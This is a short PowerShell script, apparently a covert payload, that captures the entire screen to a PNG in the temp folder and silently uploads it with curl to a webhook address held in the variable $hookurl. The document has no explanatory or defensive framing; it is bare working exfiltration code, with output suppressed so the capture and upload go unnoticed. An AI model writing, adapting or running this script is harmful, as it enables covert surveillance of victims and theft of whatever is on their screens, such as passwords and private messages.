
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$Fileto = "$env:temp\SC.png"
$width = Get-CimInstance Win32_VideoController;  $width = [int]($width).CurrentHorizontalResolution;
$height = Get-CimInstance Win32_VideoController;  $height= [int]($height).CurrentVerticalResolution; 
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
$bitmap.Save($Fileto, [System.Drawing.Imaging.ImageFormat]::png)
curl.exe  -s -o nul -F "file1=@$Fileto" $hookurl | Out-Null
